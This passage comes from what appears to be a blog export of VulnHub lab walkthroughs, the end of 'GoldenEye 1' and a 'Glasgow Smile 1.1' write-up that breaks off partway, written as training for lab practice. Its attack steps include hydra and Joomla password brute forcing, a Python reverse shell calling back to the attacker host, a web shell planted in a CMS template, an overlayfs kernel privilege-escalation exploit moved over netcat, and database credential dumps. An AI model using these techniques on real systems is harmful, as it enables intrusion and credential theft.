the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Server may leak inodes via ETags, header found with file /, inode: fc, size: 56aba821be9ed, mtime: gzip+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.+ OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2022-01-27 19:17:22 (GMT8) (53 seconds)---------------------------------------------------------------------------+ 1 host(s) tested splashAdmin.php Cobalt Qube 3 adminInitial FootholdTCP/80 (HTTP) - Hidden Directory &amp;amp; Text View to enumerated directories index.html sev-home terminal.js /sev-home Basic Authentication terminal.js Boris Encoded password Default password splashAdmin.php List of users boris/Boris janus/Janus admin/Admin natalya/Natalya xenia/Xenia Cobalt Qube 3 has been decomissioned Search exploits for Cobalt Qube 3 Exploit Title Path Cobalt Qube 3.0 - Authentication Bypass php/webapps/21640.txt Exploit did not work Decode password boris:InvincibleHack3r Proceed to /sev-home &amp;amp; login TCP/55007 - POP3 - Bruteforce + Access Emails Bruteforce POP3 ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/http] └─# hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr [DATA] attacking pop3://192.168.236.12:55007/ [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active [STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active [55007][pop3] host: 192.168.236.12 login: boris password: secret1! boris:secret1! Access SMTP w/ Thunderbird View boris’s emails alec@janus.boss No attached files natalya@ubuntu root@127.0.0.1.goldeneye New users alec natalya root Bruteforce POP3 again ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/smtp] └─# hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr -t 10 [55007][pop3] host: 192.168.236.12 login: natalya password: bird natalya:bird View natalya’s emails root@ubuntu severnaya-station.com/gnocertdir xenia:RCP90rulez! Back to TCP/80 - Obtain More Creds Add severnaya-station.com to /etc/hosts ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/cobalt] └─# echo &quot;192.168.236.12 severnaya-station.com&quot; &amp;gt;&amp;gt; /etc/hosts Proceed to /gnocertdir Login w/ xenia:RCP90rulez! moodle Search for moodle version Source Moodle &amp;gt;1.9.7 Search for exploits Exploit Title Path Moodle 3.8 - Unrestricted File Upload (2019) php/webapps/49114.txt Moodle 3.9 - Remote Code Execution (RCE) (Authenticated) (2021) php/webapps/50180.py Moodle 3.4.1 - Remote Code Execution php/webapps/46551.php Moodle 2.x/3.x - SQL Injection php/webapps/41828.php None of the exploits worked View xenia’s messages doak Back to TCP/55007 - POP3 Bruteforce POP3 again ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/smtp] └─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://$ip:55007 -e nsr -t 10 -I [55007][pop3] host: 192.168.236.12 login: doak password: goat doak:goat View doak’s emails doak@ubuntu dr_doak:4England! Back to TCP/80 - Obtain More Creds + Moodle CMS Exploit (RCE) Login w/ dr_doak:4England! &amp;amp; proceed to private files View s3cret.txt /dir007key/for-007.jpg Download /dir007key/for-007.jpg Detect any hidden files/text ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/http] └─# exiftool for-007.jpg | grep Description Image Description : eFdpbnRlcjE5OTV4IQ== Decode text ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/http] └─# echo -n eFdpbnRlcjE5OTV4IQ== | base64 -d xWinter1995x! admin:xWinter1995x! Login w/ admin:xWinter1995x! No Private Files No Messages View moodle version moodle 2.2.3 Insert reverse shell Proceed to Site Administration -&amp;gt; Server -&amp;gt; System Paths Edit Path to aspell python -c &#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.236.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; Only python reverse shell worked Proceed to Site Administration -&amp;gt; Plugins -&amp;gt; Text Editor -&amp;gt; TinyMCE editor Change Spell engine to PSpellShell Execute reverse shell by creating a post &amp;amp; toggling spell check Obtain www-data shell Credentials we have so far Username Password boris InvincibleHack3r boris secret1! natalya bird xenia RCP90rulez! doak goat dr_doak 4England! admin xWinter1995x! alec ? Privilege EscalationRabbit Hole - SQL Creds Obtain usernames Obtain MySQL creds moodle:trevelyan006x It uses psql instead of mysql Access psql www-data@ubuntu:/home$ psql -U moodle -h 127.0.0.1 moodle Password for user moodle: psql (9.3.22) SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256) Type &quot;help&quot; for help. moodle=&amp;gt; \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- moodle | moodle | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres moodle=&amp;gt; \\c moodle SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256) You are now connected to database &quot;moodle&quot; as user &quot;moodle&quot;. moodle=&amp;gt; SELECT username, password FROM mdl_user; guest | aca21c6dbd0538a171ff16550b873d70 boris | efaf365b88dee2fc2029ff20674658a7 natalya | 7a442035ba13c5d22e1e163e2117eb0d xenia | 116672a0e281b6aa277ef78f53a5f6f9 dr_doak | 488e0292fac2386d877e80f2e3a203bf admin | de51800b0404d41fcb51203f1e3e524a Crack hashes ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/sql] └─# cut -d &quot;|&quot; -f2 sqlcreds | cut -d &quot; &quot; -f2 &amp;gt; hashes ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/loot/sql] └─# hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt --show Failed to crack Root - Via Kernel Exploit Linpeas Find exploit for linux 3.13.0-32 Exploit Title Path Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation linux/local/37292.c Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation (Access /etc/shadow) linux/local/37293.txt Use linux/local/37292.c Since we do not have gcc on the target, we have to compile on our kali Compile 37292.c on kali ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# gcc -m64 37292.c -o exploit Transfer to target ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# nc -nvlp 4444 &amp;lt; exploit Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 &amp;gt; exploit Run exploit on target www-data@ubuntu:/tmp/kernel_exploit$ ./exploit spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library sh: 1: gcc: not found couldn&#39;t create dynamic library www-data@ubuntu:/tmp/kernel_exploit$ /etc/ld.so.preload is created on target /tmp/ofs-lib.c is created on target Transfer /tmp/ofs-lib.c to kali ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1]└─# nc -nvlp 4444 &amp;gt; ofs-lib.cNcat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444 www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 &amp;lt; /tmp/ofs-lib.c Compile /tmp/ofs-lib.c on kali gcc -m64 -fPIC -shared -o ofs-lib.so ofs-lib.c -ldl -w Remove Line 138-147 from 37292.c Recompile 37292.c ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# rm exploit ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# gcc -m64 37292.c -o exploitNew 37292.c: In function ‘main’: ... Transfer exploitNew &amp;amp; ofs-lib.so to target # Transfer ofs-lib.so ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# nc -nvlp 4444 &amp;lt; ofs-lib.so Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 &amp;gt; /tmp/ofs-lib.so # Transfer exploitNew ┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12/exploit/kerne1] └─# nc -nvlp 4444 &amp;lt; exploitNew Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 www-data@ubuntu:/tmp/kernel_exploit$ nc 192.168.236.4 4444 &amp;gt; exploitNew Run exploit on target again chmod +x exploitNew ./exploitNew Root Flag # cat .flag.txt Alec told me to place the codes here: 568628e0d993b1973adc718237da6e93 If you captured this make sure to go here..... /006-final/xvf7-flag/ # After reading writeups, you can just change gcc to cc in 37292.c " }, { "title": "Vulnhub - Glasglow Smile 1.1", "url": "/posts/Glasglow-Smile-1.1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/cms/joomla, linux-priv-esc/linux-creds-found, linux-priv-esc/cronjob, cryptography", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Tue Jan 25 18:30:16 2022 as: nmap -vv --reason -Pn -T4 -sV -p 80 &quot;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; -oN /root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/scans/tcp80/tcp_80_http_nmap.txt -oX /root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/scans/tcp80/xml/tcp_80_http_nmap.xml 192.168.1.1Nmap scan report for 192.168.1.1Host is up, received arp-response (0.00019s latency).Scanned at 2022-01-25 18:30:17 +08 for 17sBug in http-security-headers: no string output.PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=&amp;lt;number|all&amp;gt; for deeper analysis)|_http-errors: Couldn&#39;t find any error pages.| http-headers: | Date: Tue, 25 Jan 2022 10:30:24 GMT| Server: Apache/2.4.38 (Debian)| Last-Modified: Sat, 13 Jun 2020 18:53:52 GMT| ETag: &quot;7d-5a7fbb701d4b6&quot;| Accept-Ranges: bytes| Content-Length: 125| Vary: Accept-Encoding| Connection: close| Content-Type: text/html| |_ (Request type: HEAD)|_http-feed: Couldn&#39;t find any feeds.|_http-config-backup: ERROR: Script execution failed (use -d to debug)|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=&amp;lt;number|all&amp;gt; for deeper analysis)| http-sitemap-generator: | Directory structure:| /| Other: 1; jpg: 1| Longest directory structure:| Depth: 0| Dir: /| Total files found (by extension):|_ Other: 1; jpg: 1|_http-referer-checker: Couldn&#39;t find any cross-domain scripts.|_http-comments-displayer: Couldn&#39;t find any comments.|_http-server-header: Apache/2.4.38 (Debian)| http-useragent-tester: | Status for browser useragent: 200| Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)| libwww| lwp-trivial| libcurl-agent/1.0| PHP/| Python-urllib/2.5| GT::WWW| Snoopy| MFC_Tear_Sample| HTTP::Lite| PHPCrawl| URI::Fetch| Zend_Http_Client| http client| PECL::HTTP| Wget/1.13.4 (linux-gnu)|_ WWW-Mechanize/1.34|_http-devframework: Couldn&#39;t determine the underlying framework or CMS. Try increasing &#39;httpspider.maxpagecount&#39; value to spider more pages.|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;t find wp-login.php|_http-mobileversion-checker: No mobile version detected.|_http-chrono: Request times for /; avg: 161.31ms; min: 149.31ms; max: 207.34ms|_http-jsonp-detection: Couldn&#39;t find any JSONP endpoints.| http-vhosts: |_128 names had status 200|_http-malware-host: Host appears to be clean|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.|_http-title: Site doesn&#39;t have a title (text/html).|_http-exif-spider: ERROR: Script execution failed (use -d to debug)|_http-fetch: Please enter the complete path of the directory to save data in.|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable| http-php-version: Logo query returned unknown hash 91f9a8dbb5d9f959d393e53c5dada8fa|_Credits query returned unknown hash 91f9a8dbb5d9f959d393e53c5dada8fa| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-date: Tue, 25 Jan 2022 10:30:23 GMT; -30m01s from local time.MAC Address: 00:0C:29:4F:F2:DE (VMware)Read data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jan 25 18:30:34 2022 -- 1 IP address (1 host up) scanned in 18.68 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/GoldenEye-1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.1/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________index.html [Status: 200, Size: 125, Words: 7, Lines: 9]index.html [Status: 200, Size: 125, Words: 7, Lines: 9]joomla [Status: 301, Size: 311, Words: 20, Lines: 10]server-status [Status: 403, Size: 276, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 318 req/sec :: Duration: [0:00:05] :: Errors: 0 :: joomla Initial Foothold TCP/80 (HTTP) - Cewl + Joomla Bruteforce + Shell Upload View to enumerated directories index.html joomla Enumerate joomla ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1] └─# joomscan --url http://$ip/joomla -ec [+] FireWall Detector [++] Firewall not detected [+] Detecting Joomla Version [++] Joomla 3.7.3rc1 [+] Core Joomla Vulnerability [++] Target Joomla core is not vulnerable [+] Checking Directory Listing [++] directory has directory listing : http://192.168.1.1/joomla/administrator/components http://192.168.1.1/joomla/administrator/modules http://192.168.1.1/joomla/administrator/templates http://192.168.1.1/joomla/images/banners [+] Checking apache info/status files [++] Readable info/status files are not found [+] admin finder [++] Admin page : http://192.168.1.1/joomla/administrator/ [+] Checking robots.txt existing [++] robots.txt is found path : http://192.168.1.1/joomla/robots.txt Interesting path found from robots.txt http://192.168.1.1/joomla/joomla/administrator/ http://192.168.1.1/joomla/administrator/ http://192.168.1.1/joomla/bin/ http://192.168.1.1/joomla/cache/ http://192.168.1.1/joomla/cli/ http://192.168.1.1/joomla/components/ http://192.168.1.1/joomla/includes/ http://192.168.1.1/joomla/installation/ http://192.168.1.1/joomla/language/ http://192.168.1.1/joomla/layouts/ http://192.168.1.1/joomla/libraries/ http://192.168.1.1/joomla/logs/ http://192.168.1.1/joomla/modules/ http://192.168.1.1/joomla/plugins/ http://192.168.1.1/joomla/tmp/ http://192.168.1.1/joomla/administrator/index.php robots.txt Viewed all directories in robots.txt, could not find anything Try a bruteforce attack as a last resort Generate a custom wordlist w/ cewl ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla] └─# cewl http://192.168.1.1/joomla/index.php -w passwords.txt CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla] └─# cat &amp;gt;&amp;gt; usernames.txt &amp;lt;&amp;lt; EOF &amp;gt; Joker &amp;gt; joker &amp;gt; Arthur &amp;gt; arthur &amp;gt; Rob &amp;gt; rob &amp;gt; admin &amp;gt; joomla &amp;gt; EOF Bruteforce Joomla CMS Hydra/Burp did not work due to a unqiue token being generated https://www.securityartwork.es/2013/02/14/nmap-script-http-joomla-brute-where-thc-hydra-doesnt-fit/ NMAP Script: http-joomla-brute, https://nmap.org/nsedoc/scripts/http-joomla-brute.html http-joomla-brute.uri: specify path to /administrator/index.php CMSeek https://github.com/Tuhinshubhra/CMSeeK Bruteforce w/ nmap script ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla] └─# nmap -p80 --script http-joomla-brute 192.168.1.1 --script-args &#39;userdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/usernames.txt,passdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/passwords.txt,brute.firstonly=true,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=5&#39; Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 02:10 +08 Nmap scan report for 192.168.1.1 Host is up (0.00027s latency). PORT STATE SERVICE 80/tcp open http | http-joomla-brute: | Accounts: | joomla:Gotham - Valid credentials |_ Statistics: Performed 1342 guesses in 91 seconds, average tps: 14.4 MAC Address: 00:0C:29:4F:F2:DE (VMware) Nmap done: 1 IP address (1 host up) scanned in 91.21 seconds Bruteforce w/ CMSeek ___ _ _ ____ ____ ____ _ _ | |\\/| [__ |___ |___ |_/ by @r3dhax0r |___ | | ___| |___ |___ | \\_ Version 1.1.3 K-RONA [+] Joomla Bruteforce Module [+] Enter target site (https://example.tld): http://192.168.1.1/joomla [i] Checking for Joomla [*] Joomla Confirmed... Confirming form and getting token... [~] Enter Usernames with coma as separation without any space (example: cris,harry): joomla [i] Bruteforcing User: joomla [*] Testing Password: Gothamlkyesed [*] Password found! | |--[username]--&amp;gt; joomla | |--[password]--&amp;gt; Gotham | [*] Enjoy The Hunt! [*] Credentials stored at: /usr/share/cmseek/Result/192.168.1.1_joomla/bruteforce_result_joomla_.txt joomla:Gotham Proceed to http://192.168.1.1/joomla/administrator/index.php?option=com_templates Upload reverse shell by editing /error.php in template “protostar” Execute reverse shell at http://192.168.1.1/joomla/templates/beez3/error.php Obtain www-data shell ┌──(root💀kali)-[~/tools]└─# nc -nvlp 4444Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 192.168.1.1.Ncat: Connection from 192.168.1.1:55604.Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux 14:48:46 up 1:42, 0 users, load average: 0.08, 0.09, 0.09USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned offwhoamiwww-data$ Privilege EscalationRob - Via SQL Creds Found Find SQL Credentials www-data@glasgowsmile:/var/www$ cd /joomla2 www-data@glasgowsmile:/var/www/joomla2$ ls www-data@glasgowsmile:/var/www/joomla2$ cat configuration.php joomla:babyjoker Access MySQL, Obtain more creds from joomla_db www-data@glasgowsmile:/var/www/joomla2$ mysql -u joomla -p Enter password: babyjoker Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 15726 Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | batjoke | | information_schema | | joomla_db | | mysql | | performance_schema | +--------------------+ 5 rows in set (0.000 sec) MariaDB [(none)]&amp;gt; use joomla_db Database changed MariaDB [joomla_db]&amp;gt; SELECT username,password from jnqcu_users; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | joomla | $2y$10$9.svWPvNCg0qoD1mf8NJFe1SHltICeEvVS7alBkG3M3aFoPFge9yu | +----------+--------------------------------------------------------------+ 1 row in set (0.001 sec) No new creds Obtain credentials from batjoke MariaDB [joomla_db]&amp;gt; use batjoke Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [batjoke]&amp;gt; show tables; +-------------------+ | Tables_in_batjoke | +-------------------+ | equipment | | taskforce | +-------------------+ 2 rows in set (0.000 sec) MariaDB [batjoke]&amp;gt; select * from equipment; Empty set (0.000 sec) MariaDB [batjoke]&amp;gt; select * from taskforce; +----+---------+------------+---------+----------------------------------------------+ | id | type | date | name | pswd | +----+---------+------------+---------+----------------------------------------------+ | 1 | Soldier | 2020-06-14 | Bane | YmFuZWlzaGVyZQ== | | 2 | Soldier | 2020-06-14 | Aaron | YWFyb25pc2hlcmU= | | 3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ== | | 4 | Soldier | 2020-06-14 | buster | YnVzdGVyaXNoZXJlZmY= | | 6 | Soldier | 2020-06-14 | rob | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ | | 7 | Soldier | 2020-06-14 | aunt | YXVudGlzIHRoZSBmdWNrIGhlcmU= | +----+---------+------------+---------+----------------------------------------------+ 6 rows in set (0.000 sec) password is base64 encoded Decode password ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot] └─# cat creds | cut -d &#39;|&#39; -f5 | sed &#39;s/+\\|-\\|name//g&#39; | awk &#39;NF&#39; | tee usernames.txt Bane Aaron Carnage buster rob aunt ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot] └─# cat creds | cut -d &#39;|&#39; -f6 | sed &#39;s/+\\|-\\|pswd//g&#39; | awk &#39;NF&#39; | tee base64encoded.txt YmFuZWlzaGVyZQ== YWFyb25pc2hlcmU= Y2FybmFnZWlzaGVyZQ== YnVzdGVyaXNoZXJlZmY= Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ YXVudGlzIHRoZSBmdWNrIGhlcmU= ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot] └─# for x in $(&amp;lt;base64encoded.txt); do echo -n $x | base64 -d; echo &quot;&quot;; done | tee base64decoded.txt baneishere aaronishere carnageishere busterishereff ???AllIHaveAreNegativeThoughts??? auntis the fuck here ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot] └─# paste -d &quot;:&quot; usernames.txt base64decode.txt Bane :baneishere Aaron :aaronishere Carnage :carnageishere buster :busterishereff rob :???AllIHaveAreNegativeThoughts??? aunt :auntis the fuck here Extract usernames from /etc/passwd www-data@glasgowsmile:/home$ awk -F: &#39;($3&amp;gt;=1000)&amp;amp;&amp;amp;($1!=&quot;nobody&quot;){print $1}&#39; /etc/passwd rob abner penguin Switch to user to rob User Flag rob@glasgowsmile:~$ cat user.txt JKR[f5bb11acbb957915e421d62e7253d27a] rob@glasgowsmile:~$ Abner - Via Ciphertext View files in rob’s home directory rob@glasgowsmile:~$ ls -la total 52 drwxr-xr-x 3 rob rob 4096 Jun 16 2020 . drwxr-xr-x 5 root root 4096 Jun 15 2020 .. -rw-r----- 1 rob rob 454 Jun 14 2020 Abnerineedyourhelp -rw------- 1 rob rob 113 Jan 26 16:18 .bash_history -rw-r--r-- 1 rob rob 220 Jun 13 2020 .bash_logout -rw-r--r-- 1 rob rob 3526 Jun 13 2020 .bashrc -rw-r----- 1 rob rob 313 Jun 14 2020 howtoberoot drwxr-xr-x 3 rob rob 4096 Jun 13 2020 .local -rw------- 1 rob rob 81 Jun 15 2020 .mysql_history -rw-r--r-- 1 rob rob 807 Jun 13 2020 .profile -rw-r--r-- 1 rob rob 66 Jun 15 2020 .selected_editor -rw-r----- 1 rob rob 38 Jun 13 2020 user.txt -rw------- 1 rob rob 429 Jun 16 2020 .Xauthority rob@glasgowsmile:~$ bash_history Abnerineedyourhelp howtoberoot .local View the files .bash_history Nothing Found Abnerineedyourhelp rob@glasgowsmile:~$ cat Abnerineedyourhelp Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, &quot;Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm&#39;s.&quot; Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ== .local Nothing Found howtoberoot rob@glasgowsmile:~$ cat howtoberoot _____ ______ __ _ _ _ ____ ____ _____ ____ |_ _| _ \\ \\ / / | | | | / \\ | _ \\| _ \\| ____| _ \\ | | | |_) \\ V / | |_| | / _ \\ | |_) | | | | _| | |_) | | | | _ &amp;lt; | | | _ |/ ___ \\| _ &amp;lt;| |_| | |___| _ &amp;lt; |_| |_| \\_\\|_| |_| |_/_/ \\_\\_| \\_\\____/|_____|_| \\_\\ NO HINTS. Decipher ciphertext Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, &quot;The worst part of having a mental illness is people expect you to behave as if you don&#39;t.&quot; Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== Decode base64 encoded text ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot] └─# echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d I33hope99my0death000makes44more8cents00than0my0life0 Switch to user abner User Flag 2 abner@glasgowsmile:~$ cat user2.txt JKR{0286c47edc9bfdaf643f5976a8cfbd8d} Penguin - Via Creds Found + Cracking Zip file View files in abner home directory abner@glasgowsmile:~$ ls -la total 44 drwxr-xr-x 4 abner abner 4096 Jun 16 2020 . drwxr-xr-x 5 root root 4096 Jun 15 2020 .. -rw------- 1 abner abner 167 Jan 25 13:06 .bash_history -rw-r--r-- 1 abner abner 220 Jun 14 2020 .bash_logout -rw-r--r-- 1 abner abner 3526 Jun 14 2020 .bashrc -rw-r----- 1 abner abner 565 Jun 16 2020 info.txt drwxr-xr-x 3 abner abner 4096 Jun 14 2020 .local -rw-r--r-- 1 abner abner 807 Jun 14 2020 .profile drwx------ 2 abner abner 4096 Jun 15 2020 .ssh -rw-r----- 1 abner abner 38 Jun 16 2020 user2.txt -rw------- 1 abner abner 399 Jun 15 2020 .Xauthority abner@glasgowsmile:~$ .bash_history info.txt View the files info.txt abner@glasgowsmile:~$ cat info.txt A Glasgow smile is a wound caused by making a cut from the corners of a victim&#39;s mouth up to the ears, leaving a scar in the shape of a smile. The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly. The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a &quot;Chelsea grin&quot; or &quot;Chelsea smile&quot;). .bash_history abner@glasgowsmile:~$ cat .bash_history whoami systemctl reboot fuck su penguin mysql -u root -p exit cd .bash/ ls unzip .dear_penguins.zip cat dear_penguins rm dear_penguins exit .dear_penguins.zip Find .dear_penguins.zip abner@glasgowsmile:/home/penguin$ find / 2&amp;gt;/dev/null | grep penguin /home/penguin /home/penguin/.bash_history /home/penguin/.bashrc /home/penguin/.Xauthority /home/penguin/.bash_logout /home/penguin/.profile /home/penguin/SomeoneWhoHidesBehindAMask /home/penguin/SomeoneWhoHidesBehindAMask/user3.txt /home/penguin/SomeoneWhoHidesBehindAMask/find /home/penguin/SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old /home/penguin/.ssh /home/penguin/.local /home/penguin/.local/share /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip View permissions of /home/penguin/SomeoneWhoHidesBehindAMask abner@glasgowsmile:/home/penguin$ 